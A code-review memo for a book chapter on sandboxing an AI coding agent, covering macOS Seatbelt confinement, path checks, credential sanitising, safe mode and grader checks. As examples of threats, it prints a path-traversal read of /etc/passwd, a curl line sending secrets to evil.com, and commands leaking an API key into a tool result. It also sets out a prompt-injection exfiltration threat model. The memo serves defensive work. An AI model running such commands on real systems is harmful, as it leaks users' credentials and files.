# Chapter 23 coder review: The Sandbox

From the coder to the author. Commit `fe98828` on `main`, unpushed.

Supporting documents:

- `book/chapter-23-research.md` — every measured fact, marked VERIFIED or
  ASSUMED. This is the fact sheet to write prose against.
- `docs/ch23-design.md` — decisions and build order.

**Headline: the chapter's central mechanism does not work, and has been
replaced.** This is not a list of corrections to a working chapter. Section
23.3 describes the thesis of the shipped draft, and that thesis is
unsound. Most of the chapter needs rewriting rather than patching, so this
review is organized around what the new mechanism is before it gets to
line-level fixes.

---

## 1. Shipped state

### What is built and proven

New public package `agent/sandbox` (4 files), plus wiring.

**Two boundaries, neither redundant, because there are two kinds of
operation and no single mechanism covers both.**

| Enforcement | Guards | Why it must be this one |
|---|---|---|
| Seatbelt profile on the child process | `run_command` and its entire descendant tree | kernel; the shell never calls our Go code |
| `Sandbox.Resolve` and the confined operations | `read_file`, `write_file`, `edit_file`, `list_directory`, `search_files` | these run in-process inside the unsandboxed host binary, where the kernel cannot see them |

**Architecture.**

- `sandbox.Sandbox` holds a **back-pointer** to its parent agent through a
  one-method interface, and asks for the root on every operation rather
  than keeping a copy. `TestSandboxFollowsItsParent` moves the parent's
  root mid-test and asserts the OLD root is then refused, which fails if
  anyone adds a cache.
- `common.Agent` gained `SandboxRoot() string`.
- `common.Sandbox` is a new hub interface; `*sandbox.Sandbox` satisfies it
  structurally. Neither side imports the other, so `agent.go` carries
  `var _ common.Sandbox = (*sandbox.Sandbox)(nil)` as the only thing
  keeping them in step.
- `AgentSpec.SandboxRoot` — a path, which the existing field comment
  already permits.
- The package is **public, not internal**, because applications built on
  the framework need confined file operations too, and `internal/` makes
  that impossible. Confinement is the last thing that should be
  reimplemented per-application.

**Fails closed three ways**: a nil parent refuses every operation; an empty
root is refused by `Rooted` so unconfined must be requested by name via
`Unconfined()`; and an unsupported platform refuses to run the command
rather than running it unconfined.

### Test results

`go test ./...` — 13 packages pass, zero failures.
`go test ./sandbox/` — 30 tests, 42 including subtests, **zero skips**.
The integration tests spawn real processes under the real kernel sandbox.

### Mutation audit

Removing the `sandbox-exec` wrapping from `Command`:

| Test | Under mutation |
|---|---|
| `TestConfinedCommandAllowsLegitimateWork` | PASS (correct: the positive control) |
| `TestConfinedCommandCannotReadOutside` | FAIL |
| `TestConfinedCommandCannotWriteOutside` | FAIL |
| `TestConfinedGrandchildIsStillConfined` | FAIL |
| `TestConfinedCommandHasNoNetwork` | FAIL |
| `TestConfinedCommandHasNoCredentials` | PASS (guards the environment, which this mutant does not touch) |

On the userspace half: removing the separator from the prefix check kills
only `TestResolveRejectsSiblingPrefix`. Removing `EvalSymlinks` kills the
symlink tests and the absolute-path positive controls — a blunt mutant,
which incidentally demonstrates the macOS canonicalization requirement.

### Built in the second pass

Everything below was added after the first review was written, once the
author had ruled on the open questions. Commit `1a152d9`.

**Child permissions.** `AgentSpec.Child(dataDir)` *derives* a sub-agent
spec from its parent's instead of constructing a fresh one, and
`Clamp(parent)` narrows it. See section 6 for why derivation is the
mechanism and not a convenience.

**Safe mode** removes `run_command`, `wait_for_job`, `send_input` and
`kill_job` from the registry. The list is the exported
`SafeModeWithheldTools` rather than a literal inside `NewAgent`, so a
test can state the list it expects, and a tool added in a later chapter
cannot join the registry without someone deciding whether safe mode
should withhold it.

**Web search** is withheld by forgetting the skill, via a new
`SkillRegistry.Forget`. Chapter 21 delivered the web as a skill over MCP,
so there are no builtin tools to remove.

**Git** reads a generated config inside the sandbox. Verified: `init`,
`add`, `commit` and `log` all succeed while the host `~/.gitconfig` stays
unreadable, and an inherited `GIT_CONFIG_GLOBAL` does not survive into
the child environment.

**CLI**: `--sandbox DIR`, `--safe-mode`, `--no-web-search`, `--yolo`.

### NOT built, deliberately

- The grader and mutants script. Deliberately held: the check list in
  23.10 changes with the mechanism, and writing a grader against the old
  checks would be work thrown away. Section 7 lists what the checks
  should now assert.
- `send_secret`. It is a genuinely separate feature rather than part of
  the boundary, and section 5 recommends it as the chapter's exercise.
- Confinement is still **opt-in**: with no `--sandbox` flag the agent
  behaves exactly as it did in chapters 1 through 22. Flipping the
  default to on is a one-line change and a real decision; see section 5.

---

## 2. MUST FIX

Claims in the prose that are now factually wrong.

### 2.1 The whole mechanism: TL;DR items 1 to 4, and 23.3

The TL;DR presents userspace path confinement as the scheme. It is now
half the scheme, and the half that does not stop `run_command`.

**The flaw, stated plainly, because the chapter should admit it:** a path
check in Go guards only the tools that call it. `run_command` spawns a
shell, the shell never calls our code, and `cat ../../etc/passwd` walks
straight past. The shipped 23.4 half-notices this ("does not prevent the
command from calling `cd /`") and settles for repointing `HOME`, which is
a speed bump. The scheme is sound only in safe mode, where `run_command`
is removed — and safe mode is not the configuration anyone uses for real
work.

Section 23.3's title, "One function, every path", should survive as a
principle about the in-process tools. It must stop being the chapter's
answer to confinement.

### 2.2 Two defects in the 23.3 code sample, independent of the redesign

Both would be bugs even if the old design were sound.

1. **It never canonicalizes `root`.** On macOS `/tmp` is a symlink to
   `/private/tmp` and `/var` to `/private/var`, so `EvalSymlinks` on any
   path inside the sandbox returns a `/private/...` form that fails the
   prefix check against the raw root. The chapter's own walkthrough uses
   `mktemp -d`. **As written, the sample rejects every legitimate path on
   the author's own machine.** Verified by mutation: removing
   canonicalization fails the positive controls.
2. **It leaks the host path.** The error formats `requested` *after*
   joining it to the root, so the refusal hands the model an absolute host
   path and teaches it the filesystem layout it is confined away from. The
   brief forbids this explicitly. The shipped code reports the model's own
   string instead, and a test asserts the root does not appear in the
   error.

### 2.3 23.2 "The binary is the warden"

The conclusion holds but the reasoning needs correcting, and the
correction is the author's own: **the host binary has trivial access to
credentials and must have it.** It puts an `Authorization` header on every
request. Nothing is gained by implying the binary is contained.

The binary is trusted because it is **outside** the sandbox, not because
it is constrained. What must never see a credential is the **model**,
because the context window is the only surface prompt injection reaches,
and anything in context can be re-encoded and exfiltrated later.

Reframed that way, the three mechanisms stop looking like a grab bag and
become one rule applied to the three paths into the context window:

| Path into context | Mechanism |
|---|---|
| binary writes `api.log` inside the sandbox, model calls `read_file` on it | `SanitizeForLog`, at write time |
| key sits in the environment, model runs `env` or `curl -H "...$OPENAI_API_KEY"`, output returns as a tool result | `SanitizedEnv` |
| credential returned *as* a tool result (the October 2025 failure) | `send_secret`: write to stdin, return "credential provided" |

The ASCII diagram is still correct and worth keeping.

### 2.4 23.4 "Commands that cannot leave"

Currently says OS-level sandboxing is "outside this chapter's scope" and
that "a deployment chapter would add the OS-level seal." That is now the
heart of the chapter. Needs a full rewrite around Seatbelt.

The honest framing: this is the same mechanism OpenAI's Codex CLI ships on
macOS, and `sandbox-exec` is **deprecated in its own man page** while
remaining what everyone uses. Say both; hiding either is worse.

### 2.5 23.6 `validateChildSpec`: RESOLVED, and the resolution is better than either option

This was raised as a contradiction. The sample returns errors and the
prose insists on *"a refusal, not a negotiation"*, while the author's AND
rule silently downgrades. The resolution is that these answer two
different questions and are not alternatives at all:

- **AND** answers *what permissions does the child end up with?* That is
  enforcement.
- **Refusal** answers *what happens when someone asks for more than they
  have?* That is diagnosis.

**Do both.** `Clamp` narrows unconditionally and also returns an error
naming what was clamped. The prose keeps its sentence, and the mechanism
gets something the original design did not have.

**Why this matters more than tidiness.** In the chapter as written, the
error path *is* the security boundary. If `validateChildSpec` returns
`nil` by mistake, the child really is wider. One early return added
carelessly in a later chapter removes a wall, and nothing fails. With the
AND applied unconditionally, deleting the validator entirely cannot widen
anything. It costs a diagnostic. **The wall and the alarm are separate
things, and the error should never be the only one of the two.**

That is a better lesson than the chapter currently teaches, and it is a
lesson about security engineering rather than about Go.

**The thing that made AND tempting was a modelling error, not a safety
argument.** A two-state Boolean cannot distinguish "I did not specify"
from "I demand this", so refusing on a `false` would fire on ordinary
defaults. The fix is not a three-valued type. It is to stop constructing
the child spec from nothing: `AgentSpec.Child` copies the parent's, so
every untouched field already equals the parent's value, and any field
that differs was set deliberately. Inheritance becomes the starting state
instead of a rule someone has to remember. Two-state Booleans are then
entirely sufficient.

This is the same shape as the sandbox holding a back-pointer rather than
a copy of the root: a child's permissions are *derived* from its parent's,
not independently declared.

**Paths still refuse, and it is no longer an awkward exception.** Two
directory trees have no meet. If the child asks for somewhere outside the
parent's sandbox there is no narrower root to clamp to, so the path case
substitutes the parent's root and reports. Same rule, degenerate case.

**One asymmetry the prose should name, because it is a live footgun.**
`EnableWebSearch` is a capability, so narrowing is AND. `SafeMode` is a
restriction, which is the same statement upside down, so narrowing is OR.
Writing both as "AND the permissions" is exactly how the second one gets
implemented backwards, and backwards here means a safe-mode parent
spawning an unrestricted child.

### 2.6 `EnableWebSearch` gates a skill, not tools

**There are no builtin web tools.** Zero grep hits for `web_search`,
`crawl_web`, or `search_web`. Chapter 21 delivered web access as the
`web-search` skill wired to hosted Firecrawl MCP.

So "web search and crawl tools are not registered" cannot be implemented
as written. The equivalent one level up: when web search is disabled the
`web-search` skill is not loadable, so its MCP never connects and its
tools never bridge in. Same "absence, not instruction" principle, but the
chapter must name the right thing.

### 2.7 Function and type names

`resolveSandboxedPath` is now `Sandbox.Resolve`, a method on a public type
in `agent/sandbox`. Any prose naming the free function needs updating.

### 2.8 Features described as built that are not

- The `--yolo` flag and the three-mode table in 23.7: not implemented.
- `send_secret` in 23.5 is described as a working pattern; nothing
  implements it. Present it as a principle, or it needs building.

Either build them or mark them as the chapter's exercise. Right now a
reader following 23.9 would type a flag that does not exist.

---

## 3. Enrichment

Things the implementation revealed that the chapter could use. Several are
better teaching material than the original content, because each is a
mistake with a mechanism.

### 3.1 Why wrap the child and not the whole binary

This is the question a reader will ask, and the answer is sharp.
**macOS sandboxes are inherited by descendants** (verified: a grandchild
three levels down, and a `python3` `subprocess.run`, are both still
confined). That is what makes wrapping the child sufficient.

It is also why the binary must stay outside: a sandboxed binary needs
network to reach the model API, inheritance hands that network to every
command it runs, and `curl -d @secrets evil.com` is back. Keeping the
binary outside lets the child profile say `(deny network*)` absolutely —
the single most valuable line in the profile.

Correcting a plausible intuition: a Go binary on macOS is **not**
dependency-free. It links `libSystem`, `libresolv`, `CoreFoundation` and
`Security`. And it would not matter if it were, because `run_command`
spawns `/bin/sh`, `git` and `python3`, which need the full toolchain
allowlist regardless.

### 3.2 Three SBPL facts that cost real time

- **`(deny default)` is unusable.** The process dies before `main` with
  `execvp() failed: Operation not permitted`, and importing the system
  `bsd.sb` does not rescue it. Use `(allow default)` plus targeted denies,
  which is also Codex's shape.
- **The root directory entry must be readable.** `(allow file-read*
  (literal "/"))` or nothing starts. The denial is on `/` itself, not on a
  library, and it is invisible until you read the system log:
  `log show --predicate 'eventMessage CONTAINS "deny"'` shows
  `deny(1) file-read-data /`. Worth printing the diagnostic command.
- **SBPL matches physical paths.** `getconf DARWIN_USER_TEMP_DIR` returns
  the `/var/...` form, which **never matches**, because `/var` is a
  symlink. This is the same bug as the uncanonicalized root in 23.3:
  compare canonical paths on both sides, or compare neither. One bug
  class, two places, which makes it a lesson rather than a footnote.

### 3.3 The allowance that quietly widened the sandbox

The Xcode shims (`git`, `python3`, anything in `/usr/bin`) need to read and
write an `xcrun` cache in the Darwin per-user temp directory. The obvious
fix is to allow that directory.

**That is a real hole**: `mktemp -d` and Go's `t.TempDir()` create their
directories *inside* it, so the allowance silently covers other processes'
temporary files. Scoping by regex to files named `xcrun_db*` keeps the
toolchain working and closes it — verified, a write of an unrelated file
into that directory is then denied.

A `literal` cannot substitute: the shim creates randomly suffixed files
(`xcrun_db-eozhFtQb`).

### 3.4 Two mistakes worth printing

Both are the chapter's own thesis biting the person who wrote the code.

- **The first successful-looking experiment was worthless.** Every denial
  passed. The positive controls also failed, because the profile denied
  everything, including reading a file inside the sandbox. This is exactly
  the "sandbox that rejects everything is trivial to build and worthless
  to use" line from 23.3, caught in the act. Every escape test needs a
  paired positive control or the suite cannot tell a wall from a brick.
- **A test wrote its "outside" file into its own allowlist.** The write
  succeeded, which looked like a bug in `sandbox-exec` and was actually a
  correct profile plus an invalid test — `mktemp` had placed the "outside"
  directory inside the allowed temp dir. The near-miss is the point: the
  test would have certified a hole.

There is a third, smaller one: an early hypothesis blamed a trailing slash
on the temp-dir path. Isolating the two variables showed the realpath was
decisive and the trailing slash irrelevant. Two things were changed at
once, the symptom cleared, and the wrong cause was nearly written down as
fact.

### 3.5 What stops Codex reading your SSH keys

Direct answer to a question worth putting in the chapter, because it
justifies the stricter choice. Codex's default `workspace-write` mode
confines **writes** and denies network, but allows reads across the whole
filesystem. It can read `~/.ssh/id_rsa`. The only thing between that and
an attacker's website is the network denial: a single point of failure.
In `danger-full-access`, neither wall exists.

Read confinement gives two independent walls. That is why this chapter
goes further than the tool it is modelled on.

### 3.6 Git, confined, without touching your real config

`git` inside the sandbox fails reading `~/.gitconfig` — correct
confinement, not breakage. The clean fix is not to allow the file but to
redirect: `GIT_CONFIG_GLOBAL` pointed at a minimal generated config
*inside* the sandbox. Verified: `git init`, `add`, `commit` and `log` all
work, and the real `~/.gitconfig` stays denied.

This matters because a real `.gitconfig` can carry secrets directly
(`url.<base>.insteadOf` with an embedded token) or point at
`~/.git-credentials`, which is plaintext. "Just allow the config file"
would have been the natural fix and would have opened a credential path.

### 3.7 A small design point worth one paragraph

The public API exposes confined **operations** (`ReadFile`, `Open`,
`ReadDir`), not just a path checker. If the library exported only
`Resolve`, the natural misuse is to resolve a path and then call
`os.ReadFile` with the *original* string — which compiles, passes casual
testing, and is completely unconfined. Make the safe thing the easy thing.

---

## 4. Do NOT add

- **Do not say the binary is sandboxed or contained.** It is trusted and
  outside. Saying otherwise is the theater 23.8 attacks.
- **Do not claim portable OS-level confinement.** Only macOS is
  implemented. Linux needs Landlock and seccomp and is untested here. The
  code refuses to run rather than running unconfined on other platforms,
  which is the honest behavior to describe.
- **Do not present path resolution as sufficient.** It is the in-process
  half. Saying more is how the shipped draft went wrong.
- **Do not recommend allowing `~/.gitconfig`.** See 3.6.
- **Do not soften the deprecation.** `sandbox-exec` is deprecated and
  everyone ships on it. Both halves, plainly.
- **Do not add an approval dialog.** 23.8 is right and should stay as is;
  it is the strongest section in the chapter and needs no change.
- **Do not describe `--yolo`, `--safe-mode` or `send_secret` as working**
  until they exist.

---

## 5. Decisions for the author

1. **Read confinement — DECIDED, keeping it.** Recorded here so the
   rationale survives: exfiltration needs something to exfiltrate, and
   Codex's weaker choice is a single point of failure (3.5). Cost is the
   allowlist and some toolchain fragility, both documented.
2. **`git` — DECIDED and IMPLEMENTED.** Redirect `GIT_CONFIG_GLOBAL` to a
   generated config inside the sandbox rather than allowing the real file
   (3.6). Verified: `init`, `add`, `commit` and `log` all work, the host
   `~/.gitconfig` stays unreadable, and an inherited `GIT_CONFIG_GLOBAL`
   does not survive into the child. Worth a paragraph in the chapter: the
   obvious fix was to allow one more file, and the obvious fix was the
   dangerous one.
3. **`SafeMode` and `EnableWebSearch` on `AgentSpec` — DECIDED and
   IMPLEMENTED.** The field comment bans a new CAPABILITY, and it names
   what it means: the dependency bag that got the engine stapled nine
   times. The sin was COLLABORATORS, objects the agent reaches through.
   These are two bits of policy, and every value a caller can set takes
   capability away. A field that can only subtract cannot grow a
   dependency bag. That argument is now in the code comment, so the next
   person to add a field has to answer it rather than rediscover it.
4. **Refusal versus AND — RESOLVED and IMPLEMENTED** (2.5). They answer
   different questions, so the code now does both: `Clamp` narrows
   unconditionally and reports what it narrowed. The prose keeps *"a
   refusal, not a negotiation"*. The chapter gains a lesson it did not
   have: the error path must never be the only thing holding a security
   boundary, because deleting it should cost a diagnostic rather than a
   wall. Mutation tested in both directions, and the two properties fail
   independently.

   Two-state Booleans turned out to be sufficient once the child spec is
   *derived* from the parent's rather than constructed fresh, so the
   three-valued type I first proposed is not needed. Deriving is also the
   honest model: a child's permissions come from its parent's.
5. **Chapter 22 note.** Widening `common.Agent` forced `SandboxRoot()`
   onto five implementers including `*Logger` — the exact type ch22 used
   as its exhibit for an interface that "never grew past its name".
   Per your instruction, ch23 should carry a note. There is a nice point
   available: the `*Logger` is also a **consumer** of confined file
   operations, since it writes `api.log` and `debug.log`, which is where
   `SanitizeForLog` has to bite.
6. **Linux portability** — footnote, or a section? The code has an honest
   refusal; the chapter needs to decide how much to promise.
7. **Does 23.7 keep the three-mode table?** It is good writing, but
   nothing implements the modes yet. Build them, or reframe as the
   chapter's exercise.
8. **Chapter scope — DECIDED: one chapter.** Recorded so the rewrite does
   not relitigate it. The kernel mechanism, the credential work and the
   trust hierarchy stay together under a single unified thesis.


---

## 6. A real bug the chapter should probably mention

Writing the first safe-mode test turned up a live bug in
`Reg.RemoveTool`, and it is worth the author's attention because it is a
better illustration of this chapter's thesis than anything invented for
the purpose.

**What it was.** `RemoveTool` deleted only the *normalized* form of the
name:

```go
n := common.NormalizeName(name)   // "run_command" -> "runcommand"
delete(r.tools, n)
```

Builtins are registered under their *literal* name, and `Lookup` tries
the literal first. So `RemoveTool("run_command")` deleted a key that did
not exist, left the real entry untouched, and returned normally.
**Removing any builtin whose name contains an underscore silently did
nothing** — which is nearly all of them.

**Why it survived.** Four production callers, zero tests. And the failure
is invisible by construction: when tool removal fails, the tool is still
there, and a tool that is still there still works. Nothing errors.
Nothing logs. The only way to notice is to ask whether something that
should be absent is absent, which is not a question anyone asks about
code that appears to work.

The one caller that *did* work, `SyncModelGatedTools`, worked by
accident: it happens to use the normalized key consistently on both
sides.

**Why it belongs in this chapter.** Section 23.8 argues that security
theater is worse than no security, because it buys confidence without
buying protection. Here is that failure in the codebase, found by writing
the first test that asserted an absence rather than a presence. A safe
mode built on this function would have reported itself enabled, shown no
`run_command` anywhere in its own configuration, and left the tool fully
callable.

It also makes a sharp point about test design: **withholding is the kind
of behavior that rots silently, because nothing fails when it stops
working.** Every test of a restriction therefore needs a paired positive
control, or "the tool is gone" cannot be distinguished from "the registry
is empty" or "the test is asking the wrong question".

Fixed in `1a152d9`; removal now covers both keys, with four tests.

---

## 7. What the 23.10 checks should now assert

The seven checks and the 100-point budget are a published contract, so
this keeps the count and the shape and changes only what each one
measures. Written down now so the grader can be built straight from the
rewritten prose.

| # | Check | Points | What it must now assert |
|---|---|---|---|
| 1 | `path-confinement` | 15 | File tools refuse `..`, absolute paths, and symlinks pointing out. The in-process half. |
| 2 | `kernel-confinement` | 20 | `run_command` cannot read or write outside the root, and **a grandchild process is still confined**. This is the check that would have failed the original design. |
| 3 | `no-network` | 15 | A command inside the sandbox cannot reach the network, while the agent itself still can. |
| 4 | `no-credentials` | 15 | No credential reaches a tool result: not via the child environment, not via a log file inside the sandbox. |
| 5 | `child-cannot-widen` | 10 | **Split into two independent assertions**: the child's *effective* permissions are narrowed (survives deleting the validator), and an explicit over-request *returns an error* (dies with it). |
| 6 | `safe-mode-absence` | 15 | The exec tools are absent from the registry, **and ordinary file tools are still present**. The second half is the positive control, and section 6 explains why it is not optional. |
| 7 | `no-host-path-leak` | 10 | A refusal names the model's own string and never the resolved host path. |

Two notes for whoever writes the mutants:

- Check 5 now needs **two** mutants, not one, and each must kill exactly
  one half. That is the whole point of splitting it: removing the AND
  must not fail the error test, and removing the error must not fail the
  permissions test. Both have been verified against the shipped code.
- Check 2 needs a mutant that removes only the `sandbox-exec` wrapping.
  Verified: it fails exactly the four confinement tests while the
  positive control still passes.

---

## 8. Status

Two commits on `main`:

- `fe98828` — Seatbelt confinement and the public `agent/sandbox` package
- `1a152d9` — child clamping, safe mode, the web gate, the git redirect,
  the CLI flags, and the `RemoveTool` fix

`go test ./...` — 13 packages, zero failures. Build, vet and `gofmt`
clean. Nothing under `solutions/edition-2/` or `book/edition-2/` was
touched.

The grader remains unwritten by design. Section 7 is its specification,
and it should be built once the prose settles, not before.
